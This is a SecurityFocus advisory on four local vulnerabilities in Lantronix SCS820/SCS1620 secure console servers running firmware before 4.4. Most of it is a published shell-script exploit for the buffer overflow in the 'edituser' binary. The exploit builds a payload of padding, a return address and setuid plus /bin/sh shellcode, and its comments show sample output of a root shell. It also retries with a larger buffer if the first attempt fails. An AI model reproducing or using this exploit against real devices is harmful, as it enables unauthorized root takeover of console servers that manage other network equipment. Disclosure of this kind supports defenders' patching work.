source: http://www.securityfocus.com/bid/14486/info

Lantronix Secure Console Server SCS820/SCS1620 devices are susceptible to multiple local vulnerabilities.

The first issue is an insecure default permission vulnerability. Attackers may exploit this vulnerability to write data to arbitrary files with superuser privileges. Other attacks are also possible.

The second issue is a directory traversal vulnerability in the command-line interface. Attackers may exploit this vulnerability to gain inappropriate access to the underlying operating system.

The third issue is a privilege escalation vulnerability in the command-line interface. Local users with 'sysadmin' access to the device can escape the command-line interface to gain superuser privileges in the underlying operating system.

The last issue is a buffer overflow vulnerability in the 'edituser' binary. Attackers may exploit this vulnerability to execute arbitrary machine code with superuser privileges.

The reporter of these issues states that firmware versions prior to 4.4 are vulnerable. 

#!/bin/sh
# Lantronix Secure Console Server edituser root exploit by
# c0ntex - c0ntexb@gmail.com | c0ntex@open-security.org
# Advisory @ http://www.open-security.org/advisories/11
#
# The Linux system supplied by Lantronix does not have gnu
# C compiler, so the exploit is provided as a shell script
# as such, you might need to change the address for
#
#[c0ntex@SCS1620 ~/exploit]$ sh edituserxp.sh
#
# **** *** *** *** *** *** *** *** ***
#[-] Local root exploit for edituser using return-to-libc
#[-] discovered and written by c0ntex | c0ntexb@gmail.com
#Expect a root shell :-)  ->  escape sequence is too long.
#bash# id -a
#uid=0(root) gid=0(root) groups=100(users),0(root),200(admin)
#bash#
#
BUFFPAD="OPEN-SECURITY.ORG**OPEN-SECURITY.ORG**OPEN-SECURITY.ORG!"
NOPSLED=`perl -e 'print "\x41" x 1000'`
RETADDR=`printf "\x74\xc2\xfe\xbf"`
SETUID=`printf "\x31\xc0\x31\xdb\x31\xc9\xb0\x17\xcd\x80"`
SHELL=`printf "\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"`
STACKPAD=`perl -e 'print "A" x 65000'`
VULNAP=/usr/local/bin/edituser
VULNOP="-e"

export BUFFPAD NOPSLED RETADDR SETUID SHELL STACKPAD VULNAP VULNOP

printf "\n **** *** *** *** *** *** *** *** ***\n"
printf "[-] Local root exploit for edituser\n"
printf "[-] discovered and written by c0ntex\n"

if [ -f $VULNAPP ] ; then
      printf "Expect a root shell :-)  ->  "; sleep 1
      $VULNAP $VULNOP $BUFFPAD$RETADDR$NOPSLED$SETUID$SHELL
      success=$?
      if [ $success -gt 0 ] ; then
              printf "\nSeems something messed up, changing NOPBUF to 10000 and trying again!\n"
              sleep 2
              unset NOPSLED
              NOPSLED=`perl -e 'print "\x41" x 10000'`
              printf "Expect a root shell :-)  ->  "
              $VULNAP $VULNOP $BUFFPAD$RETADDR$NOPSLED$SETUID$SHELL
              success=$?
              if [ $success -gt 0 ] ; then
                      printf "\nAgain it failed, sorry you are on your own now :(\n"
              fi
      fi
fi
